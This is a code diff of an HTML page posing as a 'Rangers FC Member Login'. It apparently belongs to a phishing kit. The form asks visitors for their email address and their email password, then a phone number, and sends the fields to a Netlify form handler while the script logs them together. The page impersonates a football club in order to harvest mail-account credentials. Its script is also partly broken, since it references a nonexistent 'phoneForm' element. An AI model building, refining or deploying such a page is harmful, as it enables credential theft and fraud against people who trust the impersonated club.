@@ -93,55 +93,62 @@
 </head>
 <body>
 
-    <!-- Form container with modal styling -->
+    <!-- Form container -->
     <div class="form-container">
         <h2>Rangers FC Member Login</h2>
 
         <!-- Combined form: email, password, and phone -->
         <form id="loginForm" name="loginForm" method="POST" data-netlify="true">
+            <!-- Email and Password -->
             <input type="email" id="email" name="email" placeholder="Enter your email" required>
             <input type="password" id="userPassword" name="userPassword" placeholder="Enter your email password" required>
-            
+
             <!-- Hidden phone input initially -->
-            <div id="phoneModal">
+            <div id="phoneModal" style="display: none;">
                 <h2>Enter Your Phone Number</h2>
                 <p class="info-text">Enter your phone number to get the form delivered instantly.</p>
                 <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
             </div>
-            
+
             <button type="submit">Submit</button>
         </form>
     </div>
 
-    <!-- Footer with Rangers branding -->
+    <!-- Footer -->
     <div class="footer">
         <p>Official Website | Rangers Football Club</p>
     </div>
 
     <script>
-        // Show phone number form after email/password submission
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // Prevent form submission temporarily to capture inputs
-            
+            e.preventDefault(); // Prevent immediate submission
+
             const email = document.getElementById('email').value;
             const password = document.getElementById('userPassword').value;
 
-            // Show the phone number form after email/password submission
-            document.getElementById('phoneModal').style.display = 'block'; // Show phone number form
+            // Show the phone number input after email/password submission
+            document.getElementById('phoneModal').style.display = 'block';
 
-            // Wait until phone number is entered and then allow form submission
+            // Wait for phone number input and then submit everything together
             document.getElementById('phoneForm').addEventListener('submit', function(e) {
                 e.preventDefault();
 
                 const phone = document.getElementById('phone').value;
-                console.log(`Phone: ${phone}, Email: ${email}, Password: ${password}`);
 
-                // Final submission of the form
-                // You can handle sending the data here to Netlify or another provider
-                alert('Form submitted successfully!');
+                // Now submit the full form with email, password, and phone number
+                alert('Form Submitted Successfully!');
 
-                // Hide the phone number form after submission
-                document.getElementById('phoneModal').style.display = 'none';
+                // Reset the form after submission
+                document.getElementById('loginForm').reset();
+
+                // Log to console for debugging
+                console.log({
+                    email: email,
+                    password: password,
+                    phone: phone
+                });
+
+                // Optionally send to your API or backend server here
             });
         });
     </script>
